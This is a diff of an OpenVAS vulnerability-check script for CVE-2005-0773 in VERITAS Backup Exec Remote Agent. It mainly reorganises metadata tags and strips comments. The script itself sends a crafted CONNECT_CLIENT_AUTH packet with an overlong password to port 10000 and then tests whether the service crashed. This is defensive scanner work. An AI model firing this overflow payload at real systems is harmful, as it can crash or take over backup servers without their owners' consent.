@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_veritas_backup_exec_agent_win_bof_vuln.nasl 7549 2017-10-24 12:10:14Z cfischer $
+# $Id: gb_veritas_backup_exec_agent_win_bof_vuln.nasl 11169 2018-08-30 14:20:05Z asteins $
 #
 # VERITAS Backup Exec Remote Agent Windows Servers BOF Vulnerability
 #
@@ -27,12 +27,12 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.802985");
-  script_version("$Revision: 7549 $");
+  script_version("$Revision: 11169 $");
   script_cve_id("CVE-2005-0773");
   script_bugtraq_id(14022);
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2017-10-24 14:10:14 +0200 (Tue, 24 Oct 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-08-30 16:20:05 +0200 (Thu, 30 Aug 2018) $");
   script_tag(name:"creation_date", value:"2012-10-15 10:32:37 +0530 (Mon, 15 Oct 2012)");
   script_name("VERITAS Backup Exec Remote Agent Windows Servers BOF Vulnerability");
   script_category(ACT_DENIAL);
@@ -48,52 +48,34 @@ if(description)
   script_xref(name:"URL", value:"http://www.us-cert.gov/cas/techalerts/TA05-180A.html");
   script_xref(name:"URL", value:"http://archives.neohapsis.com/archives/vulnwatch/2005-q2/0073.html");
 
-  tag_impact = "Successful exploitation will allow attackers to overflow a buffer and
+  script_tag(name:"impact", value:"Successful exploitation will allow attackers to overflow a buffer and
   execute arbitrary code on the system.
 
-  Impact Level: System/Application";
-
-  tag_affected = "Veritas Backup Exec Remote Agent versions 9.0 through 10.0 for Windows Servers";
-
-  tag_insight = "The flaw is due to insufficient input validation on CONNECT_CLIENT_AUTH
+  Impact Level: System/Application");
+  script_tag(name:"affected", value:"Veritas Backup Exec Remote Agent versions 9.0 through 10.0 for Windows Servers");
+  script_tag(name:"insight", value:"The flaw is due to insufficient input validation on CONNECT_CLIENT_AUTH
   requests. CONNECT_CLIENT_AUTH requests sent with an authentication method type
   '3' indicating Windows user credentials, and an overly long password argument
-  can overflow the buffer and lead to arbitrary code execution.";
-
-  tag_solution = "Upgrade to Veritas Backup Exec Remote Agent 10.0 rev. 5520 for Windows Servers
-  For updates refer to http://www.symantec.com/index.jsp";
-
-  tag_summary = "This host is running VERITAS Backup Exec Remote Agent for Windows
-  Servers and is prone to buffer overflow vulnerability.";
-
-  script_tag(name:"impact", value:tag_impact);
-  script_tag(name:"affected", value:tag_affected);
-  script_tag(name:"insight", value:tag_insight);
-  script_tag(name:"solution", value:tag_solution);
-  script_tag(name:"summary", value:tag_summary);
+  can overflow the buffer and lead to arbitrary code execution.");
+  script_tag(name:"solution", value:"Upgrade to Veritas Backup Exec Remote Agent 10.0 rev. 5520 for Windows Servers
+  For updates refer to http://www.symantec.com/index.jsp");
+  script_tag(name:"summary", value:"This host is running VERITAS Backup Exec Remote Agent for Windows
+  Servers and is prone to buffer overflow vulnerability.");
 
   script_tag(name:"qod_type", value:"remote_vul");
+  script_tag(name:"solution_type", value:"VendorFix");
 
   exit(0);
 }
 
 include("host_details.inc");
 
-## Variable Initialization
-port = "";
-soc = "";
-buf = "";
-req = "";
-
-## Get the port
 port = 10000;
 
-## Check port state
 if(!get_port_state(port)){
   exit (0);
 }
 
-## open socket
 soc = open_sock_tcp (port);
 if(!soc){
   exit (0);
@@ -106,7 +88,6 @@ if(!buf || hexstr(buf) !~ "^80000024")
   exit(0);
 }
 
-## Construct the connect request
 req = raw_string(0x80, 0x00, 0x00, 0x1C, 0x00, 0x00, 0x00, 0x01,
                  0x42, 0xBA, 0xF9, 0x91, 0x00, 0x00, 0x00, 0x00,
                  0x00, 0x00, 0x09, 0x00, 0x00, 0x00, 0x00, 0x00,
@@ -121,7 +102,6 @@ if(!buf || hexstr(buf) !~ "^8000001c")
   exit(0);
 }
 
-## Construct CONNECT_CLIENT_AUTH request
 req = raw_string (0x80, 0x00, 0x04, 0x3E, 0x00, 0x00, 0x00, 0x02,
                   0x42, 0xBA, 0xF9, 0x91, 0x00, 0x00, 0x00, 0x00,
                   0x00, 0x00, 0x09, 0x01, 0x00, 0x00, 0x00, 0x00,
@@ -131,15 +111,12 @@ req = raw_string (0x80, 0x00, 0x04, 0x3E, 0x00, 0x00, 0x00, 0x02,
                   crap(data:"A", length:0x400) +
                   raw_string (0x00, 0x00, 0x00, 0x04, 0x04);
 
-## Send request
 send (socket:soc, data:req);
 
-## Close the socket
 close (soc);
 
 sleep(5);
 
-## Open the socket to confirm vulnerability
 soc = open_sock_tcp(port);
 if(!soc)
 {
